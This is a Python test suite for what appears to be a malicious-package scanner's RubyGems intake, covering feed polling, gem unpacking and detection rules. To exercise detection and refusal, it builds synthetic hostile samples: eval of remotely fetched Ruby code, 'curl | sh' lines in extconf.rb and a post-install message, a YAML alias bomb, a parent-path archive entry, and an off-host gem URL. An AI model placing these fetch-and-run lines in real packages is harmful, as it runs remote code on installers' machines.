"""RubyGems intake. Every HTTP call is a fake, and every gem is built in the test."""

from __future__ import annotations

import gzip
import io
import json
import logging
import tarfile
from datetime import timedelta
from urllib.parse import parse_qs, urlsplit

import pytest

from hunter.archives import ArchiveError
from hunter.cli import build_parser
from hunter.config import Config
from hunter.db import Database, utcnow
from hunter.models import ReleaseMeta
from hunter.public_feed import PublicAlert, alert_title, public_registry_url
from hunter.registry import parse_time
from hunter.rubygems import allowed_gem_url, registry_url
from hunter.rubygems.archive import extract_gem
from hunter.rubygems.feed import CHECKPOINT, poll_rubygems
from hunter.rubygems.review import classify_gem, predecessor_row, review_trees, spec_signals
from hunter.rules import scan_release
from hunter.rules.registry import load_pack
from hunter.rules.scope import ALIASES, expand, file_classes
from hunter.service import ReleaseLoader, classify_job, health_payload

BASE = "https://index.test"
EVAL = 'eval(Net::HTTP.get(URI("https://example.invalid/x")))\n'


def _config(tmp_path, **extra) -> Config:
    base = {
        "db_path": tmp_path / "hunter.sqlite3",
        "rubygems_url": BASE,
        "smart_analysis": False,
    }
    base.update(extra)
    return Config(**base)


def _query(url: str) -> dict[str, str]:
    return {key: values[0] for key, values in parse_qs(urlsplit(url).query).items()}


def _spec(extensions: list[str], message: str | None, extra: str = "") -> str:
    if extensions:
        listed = "\n".join(f"- {item}" for item in extensions)
        ext = f"extensions:\n{listed}\n"
    else:
        ext = "extensions: []\n"
    if message is None:
        msg = "post_install_message:\n"
    else:
        escaped = message.replace("\\", "\\\\").replace('"', '\\"')
        msg = f'post_install_message: "{escaped}"\n'
    return (
        "--- !ruby/object:Gem::Specification\n"
        "name: foo\n"
        "version: !ruby/object:Gem::Version\n"
        "  version: '1.0.0'\n"
        "platform: ruby\n"
        "date: 2024-12-04 00:00:00.000000000 Z\n"
        "authors:\n"
        "- !ruby/sym Ada\n"
        f"{ext}{msg}{extra}"
    )


def _tar(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as archive:
        for path, body in files.items():
            info = tarfile.TarInfo(path)
            info.size = len(body)
            archive.addfile(info, io.BytesIO(body))
    return buf.getvalue()


def _gem(files: dict[str, bytes], spec: str) -> bytes:
    members = {
        "metadata.gz": gzip.compress(spec.encode()),
        "data.tar.gz": gzip.compress(_tar(files)),
        "checksums.yaml.gz": gzip.compress(b"checksums: {}\n"),
    }
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as archive:
        for name, body in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(body)
            archive.addfile(info, io.BytesIO(body))
    return buf.getvalue()


def _meta(new: str = "1.0.0", old: str = "0.9.0") -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem="rubygems",
        name="foo",
        new_version=new,
        old_version=old,
        registry_url=registry_url("foo", new),
    )


def _row(name: str, version: str, platform: str = "ruby", yanked: bool = False, stamp: str = "2026-10-26T16:00:00.000Z") -> dict:
    return {
        "name": name,
        "version": version,
        "number": version,
        "platform": platform,
        "yanked": yanked,
        "version_created_at": stamp,
        "gem_uri": f"https://rubygems.org/gems/{name}-{version}.gem",
    }


class Pages:
    def __init__(self, pages: dict[int, list]):
        self.pages = pages
        self.urls: list[str] = []

    def __call__(self, url: str, timeout: float) -> bytes:
        self.urls.append(url)
        assert url.startswith(f"{BASE}/api/v1/timeframe_versions.json?")
        page = int(_query(url).get("page", "1"))
        return json.dumps(self.pages.get(page, [])).encode()


# --- config and scope ---------------------------------------------------------


def test_flags_default_off_and_bounds_are_enforced(monkeypatch):
    for name in (
        "HUNTER_RUBYGEMS",
        "HUNTER_RUBYGEMS_SCOUT",
        "HUNTER_RUBYGEMS_POLL_INTERVAL",
        "HUNTER_RUBYGEMS_MAX_PAGES",
        "HUNTER_RUBYGEMS_URL",
    ):
        monkeypatch.delenv(name, raising=False)
    config = Config.from_env()
    assert config.rubygems is False
    assert config.rubygems_scout is False
    assert config.rubygems_poll_interval == 60
    assert config.rubygems_max_pages == 20
    assert config.rubygems_url == "https://rubygems.org"
    monkeypatch.setenv("HUNTER_RUBYGEMS", "on")
    monkeypatch.setenv("HUNTER_RUBYGEMS_POLL_INTERVAL", "30")
    monkeypatch.setenv("HUNTER_RUBYGEMS_MAX_PAGES", "10000")
    bounded = Config.from_env()
    assert bounded.rubygems is True
    assert bounded.rubygems_poll_interval == 60
    assert bounded.rubygems_max_pages == 100


def test_ruby_is_its_own_class_and_not_part_of_code():
    assert "rb" not in ALIASES["code"]
    assert "rb" not in expand("code")
    assert file_classes("lib/foo.rb") == frozenset({"rb"})
    assert file_classes("tasks/x.rake") == frozenset({"rb"})
    assert file_classes("Rakefile") == frozenset({"rb"})
    assert file_classes("Gemfile") == frozenset({"rb"})
    assert file_classes("foo.gemspec") == frozenset({"rb"})
    assert file_classes("ext/foo/extconf.rb") == frozenset({"rb", "gem_hook"})
    assert file_classes("lib/stage.rb", hook_paths=["lib/stage.rb"]) == frozenset({"rb", "gem_hook"})
    specs = load_pack().specs
    ruby = specs["rb_eval_fetch"]
    assert ruby.tier == "weak" and ruby.eco == "rubygems"
    assert ruby.reads(frozenset({"rb"}), "rubygems")
    assert not ruby.reads(frozenset({"rb"}), "pypi")
    assert not ruby.reads(frozenset({"js"}), "rubygems")
    shell = specs["exec_download_run"]
    assert shell.eco == "both"
    assert shell.reads(frozenset({"shell"}), "rubygems")
    npm = next(spec for spec in specs.values() if spec.eco == "npm")
    assert not npm.reads(npm.scope, "rubygems")


def test_a_shell_file_inside_a_gem_still_reads_shared_rules():
    report = scan_release({}, {"bin/x.sh": "curl https://example.invalid/x | sh\n"}, ecosystem="rubygems")
    assert "exec_download_run" in {hit.rule for hit in report.hits}
    missed = scan_release({}, {"lib/v.js": "eval(atob(s))\n"}, ecosystem="rubygems")
    assert "js_dynamic_eval" not in {hit.rule for hit in missed.hits}


# --- feed ---------------------------------------------------------------------


def test_first_poll_sets_the_checkpoint_and_queues_nothing(tmp_path):
    db = Database(tmp_path / "hunter.sqlite3")
    called = []

    def transport(url, timeout):
        called.append(url)
        return b"[]"

    assert poll_rubygems(db, _config(tmp_path, rubygems=True), transport) == 0
    assert called == []
    assert db.get_checkpoint(CHECKPOINT)
    assert db.pending_count() == 0
    assert db.last_poll()["rubygems"]


def test_next_poll_queues_ruby_and_skips_the_rest(tmp_path):
    db = Database(tmp_path / "hunter.sqlite3")
    config = _config(tmp_path, rubygems=True)
    assert poll_rubygems(db, config, lambda url, timeout: b"[]") == 0
    page = [
        _row("yanked", "1.0.0", yanked=True, stamp="2026-10-26T16:01:00.000Z"),
        _row("native", "1.0.0", platform="x86_64-linux", stamp="2026-10-26T16:02:00.000Z"),
        _row("../x", "1.0.0", stamp="2026-10-26T16:03:00.000Z"),
        _row("a/b", "1.0.0", stamp="2026-10-26T16:04:00.000Z"),
        _row("good", "1.0.0", stamp="2026-10-26T16:05:00.000Z"),
    ]
    feed = Pages({1: page})
    assert poll_rubygems(db, config, feed) == 1
    jobs = {(row["ecosystem"], row["name"], row["version"]) for row in db.pending_jobs()}
    assert jobs == {("rubygems", "good", "1.0.0")}
    assert db.get_checkpoint(CHECKPOINT) == "2026-10-26T16:05:00.000Z"
    assert poll_rubygems(db, config, Pages({1: page})) == 0
    assert db.pending_count() == 1


def test_a_full_queue_does_not_pass_the_refused_row(tmp_path):
    db = Database(tmp_path / "hunter.sqlite3")
    db.set_checkpoint(CHECKPOINT, "2026-10-26T15:00:00.000Z")
    page = [
        _row("one", "1.0.0", stamp="2026-10-26T16:00:00.000Z"),
        _row("two", "1.0.0", stamp="2026-10-26T16:05:00.000Z"),
    ]
    assert poll_rubygems(db, _config(tmp_path, max_pending=1), Pages({1: page})) == 1
    assert db.get_checkpoint(CHECKPOINT) == "2026-10-26T16:00:00.000Z"
    assert [row["name"] for row in db.pending_jobs()] == ["one"]


def test_a_checkpoint_older_than_seven_days_is_clamped(tmp_path, caplog):
    db = Database(tmp_path / "hunter.sqlite3")
    db.set_checkpoint(CHECKPOINT, "2020-01-01T00:00:00Z")
    feed = Pages({1: []})
    with caplog.at_level(logging.WARNING):
        assert poll_rubygems(db, _config(tmp_path), feed) == 0
    assert db.get_checkpoint(CHECKPOINT) == "2020-01-01T00:00:00Z"
    start = parse_time(_query(feed.urls[0])["from"])
    assert start is not None
    age = utcnow() - start
    assert timedelta(days=5) < age < timedelta(days=7)
    assert "skipping" in caplog.text


def test_page_cap_stops_the_poll(tmp_path):
    db = Database(tmp_path / "hunter.sqlite3")
    db.set_checkpoint(CHECKPOINT, "2026-10-26T15:00:00.000Z")
    feed = Pages(
        {
            1: [_row("one", "1.0.0", stamp="2026-10-26T16:00:00.000Z")],
            2: [_row("two", "2.0.0", stamp="2026-10-26T16:01:00.000Z")],
        }
    )
    assert poll_rubygems(db, _config(tmp_path, rubygems_max_pages=1), feed) == 1
    assert [_query(url)["page"] for url in feed.urls] == ["1"]
    assert [row["name"] for row in db.pending_jobs()] == ["one"]


# --- gem bytes ----------------------------------------------------------------


def test_a_crafted_gem_yields_library_code_and_the_spec():
    blob = _gem({"lib/foo.rb": b"puts 1\n"}, _spec(["ext/foo/extconf.rb"], None))
    tree, spec = extract_gem(blob)
    try:
        assert tree["lib/foo.rb"] == "puts 1\n"
        assert spec["extensions"] == ["ext/foo/extconf.rb"]
        assert isinstance(spec["version"], dict)
        assert spec["version"]["version"] == "1.0.0"
        assert spec["authors"] == ["Ada"]
    finally:
        tree.close()


def test_an_alias_bomb_and_a_parent_path_are_refused():
    bomb = """--- !ruby/object:Gem::Specification
name: foo
a: &a ["x", "x"]
b: &b [*a, *a, *a, *a]
c: *b
extensions: []
"""
    with pytest.raises(ArchiveError):
        extract_gem(_gem({"lib/foo.rb": b"puts 1\n"}, bomb))
    with pytest.raises(ArchiveError):
        extract_gem(_gem({"../x": b"no\n", "lib/foo.rb": b"ok\n"}, _spec([], None)))


# --- review signals -----------------------------------------------------------


def test_remote_eval_routes_and_pkg_config_does_not():
    hit = review_trees(_meta(), {}, {"lib/app.rb": EVAL}, {}, {})
    assert hit.needs_llm_review is True
    assert hit.band == "review"
    assert "rb_eval_fetch" in {item["rule"] for item in hit.rule_hits}
    quiet = review_trees(
        _meta(),
        {},
        {"ext/foo/extconf.rb": 'system("pkg-config --exists libxml-2.0")\n'},
        {},
        {"extensions": ["ext/foo/extconf.rb"]},
    )
    assert quiet.band == "benign"
    assert quiet.needs_llm_review is False
    assert "rb_extconf_fetch" not in {item["rule"] for item in quiet.rule_hits}
    assert "gem_extension_added" not in quiet.signals
    assert "gem_extension:ext/foo/extconf.rb" in quiet.signals


def test_curl_piped_to_a_shell_in_extconf_routes():
    hit = review_trees(
        _meta(),
        {},
        {"ext/foo/extconf.rb": 'system("curl https://example.invalid/x | sh")\n'},
        {},
        {"extensions": ["ext/foo/extconf.rb"]},
    )
    assert hit.needs_llm_review is True
    assert "rb_extconf_fetch" in {item["rule"] for item in hit.rule_hits}
    fetched = scan_release(
        {},
        {"ext/foo/extconf.rb": 'Net::HTTP.get(URI("https://example.invalid/x"))\n'},
        ecosystem="rubygems",
    )
    assert "rb_extconf_fetch" in {item.rule for item in fetched.hits}
    remote = scan_release(
        {},
        {"lib/app.rb": 'instance_eval(Net::HTTP.get(URI("https://example.invalid/x")))\n'},
        ecosystem="rubygems",
    )
    assert "rb_eval_fetch" in {item.rule for item in remote.hits}


def test_extension_and_post_install_signals():
    normal = spec_signals({}, {"extensions": ["ext/foo/extconf.rb"]})
    assert "gem_extension_added" not in normal
    stray = review_trees(_meta(), {}, {"lib/stage.rb": "puts 1\n"}, {}, {"extensions": ["lib/stage.rb"]})
    assert stray.needs_llm_review is True
    assert "gem_extension_added" in stray.signals
    docs = review_trees(_meta(), {}, {}, {}, {"post_install_message": "see https://example.com/docs"})
    assert docs.band == "benign"
    assert "gem_post_install_shell" not in docs.signals
    shell = review_trees(
        _meta(),
        {},
        {},
        {},
        {"post_install_message": "curl https://example.invalid/x | sh"},
    )
    assert shell.needs_llm_review is True
    assert "gem_post_install_shell" in shell.signals
    same = spec_signals(
        {"post_install_message": "curl https://example.invalid/x | sh"},
        {"post_install_message": "curl https://example.invalid/x | sh"},
    )
    assert "gem_post_install_shell" not in same


def test_predecessor_skips_yanked_and_other_platforms():
    rows = [
        {"number": "1.2.0", "platform": "ruby"},
        {"number": "1.2.0", "platform": "x86_64-linux"},
        {"number": "1.1.0", "platform": "ruby", "yanked": True},
        {"number": "1.0.0", "platform": "ruby"},
    ]
    assert predecessor_row(rows, "1.2.0")["number"] == "1.0.0"


# --- classify, loader, reporting ---------------------------------------------


def _versions(*rows: dict) -> bytes:
    return json.dumps(list(rows)).encode()


def test_classify_job_stores_review_and_does_not_call_scout(tmp_path):
    db = Database(tmp_path / "hunter.sqlite3")
    config = _config(tmp_path, rubygems=True, rubygems_scout=False)
    blob = _gem({"lib/app.rb": EVAL.encode()}, _spec([], None))
    db.enqueue_job("rubygems", "foo", "1.2.3", None)

    class Scout:
        def __getattr__(self, name):
            raise AssertionError(f"scout called: {name}")

    def transport(url, timeout):
        if url == f"{BASE}/api/v1/versions/foo.json":
            return _versions({"number": "1.2.3", "platform": "ruby", "created_at": "2026-10-26T00:00:00Z"})
        if url == "https://rubygems.org/gems/foo-1.2.3.gem":
            return blob
        raise AssertionError(url)

    classify_job(db, config, db.pending_jobs()[0], jev=Scout(), loader=ReleaseLoader(config, transport), transport=transport)
    stored = json.loads(db.get_release("rubygems", "foo", "1.2.3")["payload_json"])
    assert stored["band"] == "review"
    assert "rb_eval_fetch" in {item["rule"] for item in stored["rule_hits"]}


def test_loader_scores_two_named_versions_and_refuses_another_host(tmp_path):
    config = _config(tmp_path)
    new_gem = _gem({"lib/foo.rb": b"puts 1\n"}, _spec([], None))
    old_gem = _gem({"lib/foo.rb": b"puts 0\n"}, _spec([], None))
    calls: list[str] = []

    def transport(url, timeout):
        calls.append(url)
        if url == f"{BASE}/api/v1/versions/foo.json":
            return _versions(
                {"number": "1.0.0", "platform": "ruby"},
                {"number": "0.9.0", "platform": "ruby"},
            )
        if url == "https://rubygems.org/gems/foo-1.0.0.gem":
            return new_gem
        if url == "https://rubygems.org/gems/foo-0.9.0.gem":
            return old_gem
        raise AssertionError(url)

    loader = ReleaseLoader(config, transport)
    old_files, new_files, meta = loader.load_versions("rubygems", "foo", "0.9.0", "1.0.0")
    try:
        assert new_files["lib/foo.rb"] == "puts 1\n"
        assert old_files["lib/foo.rb"] == "puts 0\n"
        assert meta.old_version == "0.9.0"
        assert meta.registry_url == "https://rubygems.org/gems/foo/versions/1.0.0"
    finally:
        old_files.close()
        new_files.close()
    args = build_parser().parse_args(
        ["score", "--ecosystem", "rubygems", "--name", "foo", "--old", "0.9.0", "--new", "1.0.0"]
    )
    assert args.ecosystem == "rubygems"

    def evil(url, timeout):
        calls.append(url)
        if url.endswith("/versions/foo.json"):
            return _versions({"number": "1.0.0", "platform": "ruby", "gem_uri": "https://evil.example/gems/foo-1.0.0.gem"})
        raise AssertionError(url)

    calls.clear()
    with pytest.raises(ArchiveError):
        ReleaseLoader(config, evil).load_versions("rubygems", "foo", "0.9.0", "1.0.0")
    assert calls and all("evil.example" not in url for url in calls)
    assert allowed_gem_url("https://rubygems.org/downloads/foo-1.0.0.gem")
    assert not allowed_gem_url("http://rubygems.org/gems/foo-1.0.0.gem")


def test_public_feed_and_health_know_rubygems(tmp_path):
    assert public_registry_url("rubygems", "https://rubygems.org/gems/foo/versions/1.0.0")
    assert public_registry_url("rubygems", "https://evil.example/gems/foo/versions/1.0.0") == ""
    alert = PublicAlert("rubygems", "foo", "1.0.0", "0.9.0", "", "", "", False, "2026-10-26T00:00:00Z")
    assert alert_title(alert) == "Malicious RubyGems package: foo 1.0.0"
    db = Database(tmp_path / "hunter.sqlite3")
    assert "rubygems" not in health_payload(db, 0.0, config=_config(tmp_path))
    assert health_payload(db, 0.0, config=_config(tmp_path, rubygems=True))["rubygems"] == {
        "checkpoint": None,
        "last_queued": 0,
    }


def test_classify_gem_returns_the_review_row(tmp_path):
    """The hostile synthetic sets needs_llm_review before the row is stored."""
    config = _config(tmp_path, rubygems_scout=False)
    blob = _gem({"lib/app.rb": EVAL.encode()}, _spec([], None))

    def transport(url, timeout):
        if url.endswith("/versions/foo.json"):
            return _versions({"number": "1.2.3", "platform": "ruby"})
        if url == "https://rubygems.org/gems/foo-1.2.3.gem":
            return blob
        raise AssertionError(url)

    result, old_files, new_files, _meta_row = classify_gem(
        None,
        config,
        {"name": "foo", "version": "1.2.3", "rank": None},
        transport=transport,
        jev=object(),
    )
    try:
        assert result.needs_llm_review is True
        assert result.band == "review"
    finally:
        old_files.close()
        new_files.close()
